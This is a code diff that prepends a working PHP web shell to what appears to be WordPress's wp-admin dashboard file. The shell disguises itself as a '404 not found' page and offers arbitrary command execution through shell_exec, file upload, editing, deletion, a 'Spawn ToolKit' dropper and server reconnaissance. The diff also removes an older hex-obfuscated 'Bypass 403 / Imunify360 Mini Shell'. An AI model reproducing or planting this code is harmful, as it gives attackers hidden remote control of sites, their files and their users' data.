@@ -1,83 +1,501 @@
+<html><head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"><style>@import url('https://fonts.googleapis.com/css?family=Dosis');@import url('https://fonts.googleapis.com/css?family=Bungee');td,th,thead{border:1px solid #fff;padding:5px;box-shadow: 0 0 10px 0 #707070}tr{background-color:#fff}body{font-family:"Dosis",cursive;text-shadow:0px 0px 1px #707070}</style></head><body><center>
+  <?php
+error_reporting(0);
+$currentPath = getcwd();
+$pathComponents = explode(DIRECTORY_SEPARATOR, $currentPath);
+echo "<font face='Bungee' size='3'><h1>&#128013; 404 not found</h1></font><div class='container'><div id='pw'>Home: ";
+foreach ($pathComponents as $index => $component) {
+    $partialPath = implode(DIRECTORY_SEPARATOR, array_slice($pathComponents, 0, $index + 1));
+    $partialPath = str_replace("%2F", "/", rawurlencode($partialPath));
+    echo "<a href='?path=" . $partialPath . "'>" . $component . "</a>";
+    if ($index < count($pathComponents) - 1) {
+        echo "/";
+    }
+}
+echo "</div><br>";
+?>
+  <form method="GET"><input type="text" name="path" autocomplete="off" size="100" class="textinput" required><input type="submit" class="submit"></form>
+  <?php
+  if (htmlspecialchars(isset($_GET["path"]))) {
+    $path = $_GET["path"];
+    $file = $_GET["file"];
+    $folder = $_GET["folder"];
+    $folder_name = basename($folder);
+    $file_name = basename($file);
+    ?>
+    <script>
+      const path = document.querySelector('input[name=path]')
+      path.value = '<?php echo $_GET["path"]; ?>'
+    </script><a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfolder"><button type="button" class="button-tools">+Folder</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfile"><button type="button" class="button-tools">+File</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawntools"><button type="button" class="button-tools">Spawn ToolKit</button></a>
+    <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" class="button-tools">Info Min</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" class="button-tools">Upload</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=cmd"><button type="button" class="button-tools">Command</button></a><br><br>
+    <?php
+    if ($_GET["action"] == "view") {
+      echo "<p class='text-center'>Filename: $file_name</p>";
+      echo "<textarea class='textarea' disabled>".htmlspecialchars(file_get_contents($file))."</textarea>";
+    } elseif ($_GET["action"] == "edit" && $file) {
+        ?>
+        <form method="POST"><p>Filename:<?php echo $file_name; ?></p><?php echo "<textarea name='content' class='textarea'>".htmlspecialchars(file_get_contents($file))." </textarea>"; ?><input type="submit" name="edit" class="submit"></form>
+        <?php
+        if (isset($_POST["edit"])) {
+          $editted = base64_encode($_POST["content"]);
+          $save = saveme($file, base64_decode($editted));
+          if ($save) {
+            echo "<script>alert('Edit $file_name success')</script>";
+            echo "<script>window.location = '?path=$path&action=edit&file=$file'</script>";
+          } else {
+            echo "Edit $file_name failed";
+          }
+        }
+      } elseif ($_GET["action"] == "rename" && $file) {
+        renames($file, $path, $file_name);
+      } elseif ($_GET["action"] == "rename" && $folder) {
+        renames($folder, $path, $folder_name);
+      } elseif ($_GET["action"] == "delete" && $file) {
+        if (unlink($file)) {
+          echo "<script>alert('Delete $file_name success')</script>";
+          echo "<script>window.location = '?path=$path'</script>";
+        } else {
+          echo "Delete $file_name failed";
+        }
+      } elseif ($_GET["action"] == "delete" && $folder) {
+        if (is_dir($folder)) {
+          if (is_writable($folder)) {
+            @rmdir($folder);
+            @shell_exec("rm -rf $folder");
+            @shell_exec("rmdir /s /q $folder");
+            echo "<script>alert('$folder_name Deleted')</script>";
+            echo "<script>window.location = '?path=$path'</script>";
+          } else {
+            echo "Delete $folder_name failed";
+          }
+        }
+      } elseif ($_GET["action"] == "spawntools") {
+        $save = saveme($path."/tools.php", base64_decode($tools));
+        echo "<center>";
+        if ($save) {
+          echo "<script>alert('Spawn Toolkit tools.php success')</script>";
+          echo "<script>window.location = '?path=$path'</script>";
+        } else {
+          echo "Spawn Toolkit failed";
+        }
+        echo "</center>";
+      } elseif ($_GET["action"] == "createfile") {
+        ?>
+        <form method="POST"><input type="text" name="filename" class="textinput"><textarea name="filetext" class="textarea"></textarea><input type="submit" name="touch" class="submit"></form>
+        <?php
+        if (isset($_POST["touch"])) {
+          $filename = $_POST["filename"];
+          $filetext = base64_encode($_POST["filetext"]);
+          $save = saveme($path."/".$filename, base64_decode($filetext));
+          if ($save) {
+            echo "<script>alert('".$filename." has successfully created')</script>";
+            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
+          } else {
+            echo "Create file failed";
+          }
+        }
+      } elseif ($_GET["action"] == "createfolder") {
+        ?>
+        <form method="POST"><input type="text" name="foldername" autocomplete="off" class="inputtext textinput"><input type="submit" name="cfolder" class="submit"></form>
+        <?php
+        if (isset($_POST["cfolder"])) {
+          $fname = $_POST["foldername"];
+          if (@mkdir($path."/".$fname)) {
+            echo "<script>alert('$fname Created')</script>";
+            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
+          } else {
+            echo "Create folder failed";
+          }
+        }
+      } elseif ($_GET["action"] == "upload") {
+        ?>
+        <form method="POST" enctype="multipart/form-data"><input type="file" name="nax_file" id="naxx"><input type="submit" name="upkan" class="submit"></form>
+        <?php
+        if (isset($_POST["upkan"])) {
+          if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $path."/".$_FILES["nax_file"]["name"])) {
+            $file = $_FILES["nax_file"]["name"];
+            echo "<script>alert('$file uploaded')</script>";
+            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
+          } else {
+            echo "<center>Upload fail</center>";
+          }
+        }
+      } elseif ($_GET["action"] == "cmd") {
+        ?>
+        <form method="POST"><input type="text" name="cmd" autocomplete="off" size="100" class="inputtext textinput"><input type="submit" name="exec" class="submit"></form>
+        <?php
+        if (isset($_POST["exec"])) {
+          $cmd = $_POST["cmd"];
+          echo "<div class='cmd'>".@shell_exec($cmd)."</div>";
+        }
+      } elseif ($_GET["action"] == "info") {
+        echo '<div class="wrap">';
+        infomin();
+        echo '</div>';
+      } else {
+          ?>
+          <div class="wrap"><table><thead><tr><th>Items</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody>
+                <?php
+                $scan = scandir($path);
+                foreach ($scan as $folders) {
+                  if (!is_dir($path."/".$folders) || $folders == ".." || $folders == ".") {
+                    continue;
+                  }
+                  ?>
+                  <tr><td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path/$folders'><i class='fas fa-folder'></i> $folders</a>"; ?></td><td nowrap="nowrap" width="100">---</td><td nowrap="nowrap" width="150">
+                        <?php
+                        if (is_writable($path."/".$folders)) {
+                          $color = "lime";
+                        } else {
+                          $color = "red";
+                        }
+                        echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
+                        ?>
+                    </td><td nowrap="nowrap" width="90">
+                      <?php echo "
+            <a href='?path=$path&action=rename&folder=$path/$folders'><i class='fas fa-pen'></i></a><a href='?path=$path&action=delete&folder=$path/$folders'><i class='fas fa-trash-alt'></i></a>
+            "; ?>
+                    </td></tr>
+                  <?php
+                }
+                foreach ($scan as $files) {
+                  if (is_file($path."/".$files)) {
+                    ?>
+                    <tr><td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path&action=view&file=$path/$files'><i class='fas fa-file'></i> $files</a>"; ?></td><td nowrap="nowrap" width="100"><?php echo "".Size($path."/".$files).""; ?></td><td nowrap="nowrap" width="150">
+                          <?php
+                          if (is_writable($path."/".$files)) {
+                            $color = "lime";
+                          } else {
+                            $color = "red";
+                          }
+                          echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
+                          ?>
+                      </td><td nowrap="nowrap" width="90">
+                        <?php echo "
+              <a href='?path=$path&action=edit&file=$path/$files'><i class='fas fa-edit'></i></a><a href='?path=$path&action=rename&file=$path/$files'><i class='fas fa-pen'></i></a><a href='?path=$path&action=delete&file=$path/$files'><i class='fas fa-trash-alt'></i></a>
+              "; ?>
+                      </td></tr>
+                    <?php
+                  }
+                }
+                echo "</tbody></table></div>";
+              }
+            }
+          function saveme($name, $content) {
+            $open = fopen($name, "w");
+            fwrite($open, $content);
+            fclose($open);
+            return $open;
+          }
+          function renames($item, $path, $name) {
+            ?>
+            <form method="POST"><input type="text" name="newname" value="<?php echo $name; ?>" size="50" class="textinput inputtext"><input type="submit" name="rename" class="submit"></form>
+            <?php
+            if (isset($_POST["rename"])) {
+              $new = $_POST["newname"];
+              if (rename($item, $path."/".$new)) {
+                echo "<script>alert('$name successfully renamed')</script>";
+                echo "<script>window.location = '?path=$path'</script>";
+              } else {
+                echo "Rename failed";
+              }
+            }
+          }
+          function Size($path) {
+            $bytes = sprintf('%u', filesize($path));
+            if ($bytes > 0) {
+              $unit = intval(log($bytes, 1024));
+              $units = array('B', 'KB', 'MB', 'GB');
+              if (array_key_exists($unit, $units) === true) {
+                return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
+              }
+            }
+            return $bytes;
+          }
+          function infomin() {
+            $curl = (function_exists("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $wget = (@shell_exec("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $python = (@shell_exec("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $disfuncs = @ini_get("disable_functions");
+            $showit = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
+            echo "<div class='infomin wrap'>";
+            echo "OS : ".php_uname()."<br>";
+            echo "SERVER IP : ".$_SERVER["SERVER_ADDR"]."<br>";
+            echo "SOFTWARE : ".$_SERVER["SERVER_SOFTWARE"]."<br>";
+            echo "Disabled Functions : $showit<br>";
+            echo "CURL : $curl | WGET : $wget | PERL : $perl | RUBY : $ruby | PYTHON : $python | GCC : $gcc | PKEXEC : $pkexec";
+            echo "</div>";
+          }
+
+          function hi_permission($items) {
+            $perms = fileperms($items);
+            if (($perms & 0xC000) == 0xC000) {
+              $info = 's';
+            } elseif (($perms & 0xA000) == 0xA000) {
+              $info = 'l';
+            } elseif (($perms & 0x8000) == 0x8000) {
+              $info = '-';
+            } elseif (($perms & 0x6000) == 0x6000) {
+              $info = 'b';
+            } elseif (($perms & 0x4000) == 0x4000) {
+              $info = 'd';
+            } elseif (($perms & 0x2000) == 0x2000) {
+              $info = 'c';
+            } elseif (($perms & 0x1000) == 0x1000) {
+              $info = 'p';
+            } else {
+              $info = 'u';
+            }
+            $info .= (($perms & 0x0100) ? 'r' : '-');
+            $info .= (($perms & 0x0080) ? 'w' : '-');
+            $info .= (($perms & 0x0040) ?
+              (($perms & 0x0800) ? 's' : 'x') :
+              (($perms & 0x0800) ? 'S' : '-'));
+            $info .= (($perms & 0x0020) ? 'r' : '-');
+            $info .= (($perms & 0x0010) ? 'w' : '-');
+            $info .= (($perms & 0x0008) ?
+              (($perms & 0x0400) ? 's' : 'x') :
+              (($perms & 0x0400) ? 'S' : '-'));
+            $info .= (($perms & 0x0004) ? 'r' : '-');
+            $info .= (($perms & 0x0002) ? 'w' : '-');
+            $info .= (($perms & 0x0001) ?
+              (($perms & 0x0200) ? 't' : 'x') :
+              (($perms & 0x0200) ? 'T' : '-'));
+            return $info;
+          }
+          ?>
+        </div><script>
+          const file = document.querySelector('input[type="file"]')
+          const label = document.querySelector('label[for="naxx"]')
+          file.addEventListener('change', () => {
+            if (file.value.length == '0') {
+              label.innerText = 'Choose File Here'
+            } else if (file.value.length >= '30') {
+              value = file.value.substring(0, 30) + "..."
+              label.innerText = value
+            } else {
+              label.innerText = file.value
+            }
+          })
+        </script></body></html>
+ <?php
+/**
+ * Dashboard Administration Screen
+ *
+ * @package WordPress
+ * @subpackage Administration
+ */
+
+/** Load WordPress Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+/** Load WordPress dashboard API */
+require_once ABSPATH . 'wp-admin/includes/dashboard.php';
+
+wp_dashboard_setup();
+
+wp_enqueue_script( 'dashboard' );
+
+if ( current_user_can( 'install_plugins' ) ) {
+	wp_enqueue_script( 'plugin-install' );
+	wp_enqueue_script( 'updates' );
+}
+if ( current_user_can( 'upload_files' ) ) {
+	wp_enqueue_script( 'media-upload' );
+}
+add_thickbox();
+
+if ( wp_is_mobile() ) {
+	wp_enqueue_script( 'jquery-touch-punch' );
+}
+
+// Used in the HTML title tag.
+$title       = __( 'Dashboard' );
+$parent_file = 'index.php';
+
+$help  = '<p>' . __( 'Welcome to your WordPress Dashboard!' ) . '</p>';
+$help .= '<p>' . __( 'The Dashboard is the first place you will come to every time you log into your site. It is where you will find all your WordPress tools. If you need help, just click the &#8220;Help&#8221; tab above the screen title.' ) . '</p>';
+
+$screen = get_current_screen();
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'overview',
+		'title'   => __( 'Overview' ),
+		'content' => $help,
+	)
+);
+
+// Help tabs.
+
+$help  = '<p>' . __( 'The left-hand navigation menu provides links to all of the WordPress administration screens, with submenu items displayed on hover. You can minimize this menu to a narrow icon strip by clicking on the Collapse Menu arrow at the bottom.' ) . '</p>';
+$help .= '<p>' . __( 'Links in the Toolbar at the top of the screen connect your dashboard and the front end of your site, and provide access to your profile and helpful WordPress information.' ) . '</p>';
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'help-navigation',
+		'title'   => __( 'Navigation' ),
+		'content' => $help,
+	)
+);
+
+$help  = '<p>' . __( 'You can use the following controls to arrange your Dashboard screen to suit your workflow. This is true on most other administration screens as well.' ) . '</p>';
+$help .= '<p>' . __( '<strong>Screen Options</strong> &mdash; Use the Screen Options tab to choose which Dashboard boxes to show.' ) . '</p>';
+$help .= '<p>' . __( '<strong>Drag and Drop</strong> &mdash; To rearrange the boxes, drag and drop by clicking on the title bar of the selected box and releasing when you see a gray dotted-line rectangle appear in the location you want to place the box.' ) . '</p>';
+$help .= '<p>' . __( '<strong>Box Controls</strong> &mdash; Click the title bar of the box to expand or collapse it. Some boxes added by plugins may have configurable content, and will show a &#8220;Configure&#8221; link in the title bar if you hover over it.' ) . '</p>';
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'help-layout',
+		'title'   => __( 'Layout' ),
+		'content' => $help,
+	)
+);
+
+$help = '<p>' . __( 'The boxes on your Dashboard screen are:' ) . '</p>';
+
+if ( current_user_can( 'edit_theme_options' ) ) {
+	$help .= '<p>' . __( '<strong>Welcome</strong> &mdash; Shows links for some of the most common tasks when setting up a new site.' ) . '</p>';
+}
+
+if ( current_user_can( 'view_site_health_checks' ) ) {
+	$help .= '<p>' . __( '<strong>Site Health Status</strong> &mdash; Informs you of any potential issues that should be addressed to improve the performance or security of your website.' ) . '</p>';
+}
+
+if ( current_user_can( 'edit_posts' ) ) {
+	$help .= '<p>' . __( '<strong>At a Glance</strong> &mdash; Displays a summary of the content on your site and identifies which theme and version of WordPress you are using.' ) . '</p>';
+}
+
+$help .= '<p>' . __( '<strong>Activity</strong> &mdash; Shows the upcoming scheduled posts, recently published posts, and the most recent comments on your posts and allows you to moderate them.' ) . '</p>';
+
+if ( is_blog_admin() && current_user_can( 'edit_posts' ) ) {
+	$help .= '<p>' . __( "<strong>Quick Draft</strong> &mdash; Allows you to create a new post and save it as a draft. Also displays links to the 3 most recent draft posts you've started." ) . '</p>';
+}
+
+$help .= '<p>' . sprintf(
+	/* translators: %s: WordPress Planet URL. */
+	__( '<strong>WordPress Events and News</strong> &mdash; Upcoming events near you as well as the latest news from the official WordPress project and the <a href="%s">WordPress Planet</a>.' ),
+	__( 'https://planet.wordpress.org/' )
+) . '</p>';
+
+$screen->add_help_tab(
+	array(
+		'id'      => 'help-content',
+		'title'   => __( 'Content' ),
+		'content' => $help,
+	)
+);
+
+unset( $help );
+
+$wp_version = get_bloginfo( 'version', 'display' );
+/* translators: %s: WordPress version. */
+$wp_version_text = sprintf( __( 'Version %s' ), $wp_version );
+$is_dev_version  = preg_match( '/alpha|beta|RC/', $wp_version );
+
+if ( ! $is_dev_version ) {
+	$version_url = sprintf(
+		/* translators: %s: WordPress version. */
+		esc_url( __( 'https://wordpress.org/documentation/wordpress-version/version-%s/' ) ),
+		sanitize_title( $wp_version )
+	);
+
+	$wp_version_text = sprintf(
+		'<a href="%1$s">%2$s</a>',
+		$version_url,
+		$wp_version_text
+	);
+}
+
+$screen->set_help_sidebar(
+	'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
+	'<p>' . __( '<a href="https://wordpress.org/documentation/article/dashboard-screen/">Documentation on Dashboard</a>' ) . '</p>' .
+	'<p>' . __( '<a href="https://wordpress.org/support/forums/">Support forums</a>' ) . '</p>' .
+	'<p>' . $wp_version_text . '</p>'
+);
+
+require_once ABSPATH . 'wp-admin/admin-header.php';
+?>
+
+<div class="wrap">
+	<h1><?php echo esc_html( $title ); ?></h1>
+
+	<?php
+	if ( ! empty( $_GET['admin_email_remind_later'] ) ) :
+		/** This filter is documented in wp-login.php */
+		$remind_interval = (int) apply_filters( 'admin_email_remind_interval', 3 * DAY_IN_SECONDS );
+		$postponed_time  = get_option( 'admin_email_lifespan' );
+
+		/*
+		 * Calculate how many seconds it's been since the reminder was postponed.
+		 * This allows us to not show it if the query arg is set, but visited due to caches, bookmarks or similar.
+		 */
+		$time_passed = time() - ( $postponed_time - $remind_interval );
+
+		// Only show the dashboard notice if it's been less than a minute since the message was postponed.
+		if ( $time_passed < MINUTE_IN_SECONDS ) :
+			$message = sprintf(
+				/* translators: %s: Human-readable time interval. */
+				__( 'The admin email verification page will reappear after %s.' ),
+				human_time_diff( time() + $remind_interval )
+			);
+			wp_admin_notice(
+				$message,
+				array(
+					'type'        => 'success',
+					'dismissible' => true,
+				)
+			);
+		endif;
+	endif;
+	?>
+
 <?php
-error_reporting(0); http_response_code(404); define("Yp", "Bypass 403 Forbidden / 406 Not Acceptable / Imunify360 / Mini Shell"); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
-<!doctype html>
-<html lang="en">
-<head>
-	<meta name="theme-color" content="red">
-	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
-	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
-	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-	<title>Bypass Sh3ll</title>
-	<style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
-	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-</head>
-<body style="background-color:#000;color:#fff;font-family:serif;">
-	<div class="bg-dark table-responsive text-light border">
-		<div class="d-flex justify-content-between p-1">
-			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
-			<div>
-				<span>PHP Version : <?= $c8[1](); ?></span> <br>
-				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>">Add New File</a>
-				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>">Add New Directory</a>
-			</div>
-		</div>
-		<div class="border-top table-responsive">
-			<li>Server : <?= "{$_SERVER["SERVER_NAME"]} ({$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]})"; ?></li>
-		</div>
-		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
-		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
+if ( has_action( 'welcome_panel' ) && current_user_can( 'edit_theme_options' ) ) :
+	$classes = 'welcome-panel';
+
+	$option = (int) get_user_meta( get_current_user_id(), 'show_welcome_panel', true );
+	// 0 = hide, 1 = toggled to show or single site creator, 2 = multisite site owner.
+	$hide = ( 0 === $option || ( 2 === $option && wp_get_current_user()->user_email !== get_option( 'admin_email' ) ) );
+	if ( $hide ) {
+		$classes .= ' hidden';
+	}
+	?>
+
+	<div id="welcome-panel" class="<?php echo esc_attr( $classes ); ?>">
+		<?php wp_nonce_field( 'welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
+		<a class="welcome-panel-close" href="<?php echo esc_url( admin_url( '?welcome=0' ) ); ?>" aria-label="<?php esc_attr_e( 'Dismiss the welcome panel' ); ?>"><?php _e( 'Dismiss' ); ?></a>
+		<?php
+		/**
+		 * Fires when adding content to the welcome panel on the admin dashboard.
+		 *
+		 * To remove the default welcome panel, use remove_action():
+		 *
+		 *     remove_action( 'welcome_panel', 'wp_welcome_panel' );
+		 *
+		 * @since 3.5.0
+		 */
+		do_action( 'welcome_panel' );
+		?>
 	</div>
-	<div class="bg-dark border table-responsive mt-2">
-		<div class="ml-2" style="font-size:18px;">
-			<span>Path: </span>
-			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
-		</div>
-	</div>
-	<article class="bg-dark border table-responsive mt-2">
-		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
-		<div class="px-2 py-2">
-			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
-			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
-			<h5 class="border p-1 mb-3">New folder</h5>
-			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
-			<h5 class="border p-1 mb-3">New file</h5>
-			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
-			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
-			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
-			<h5 class="border p-1 mb-3">Edit file</h5>
-			<span>File name : <?= Jd($_GET["n"]); ?></span>
-			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
-			<h5 class="border p-1 mb-3">View file</h5>
-			<span>File name : <?= jd($_GET["n"]); ?></span>
-			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
-			<?php  WC: ?>
-		</div>
-		<?php  goto mR; Un: ?>
-		<table class="table table-hover table-bordered table-sm">
-			<thead class="text-light">
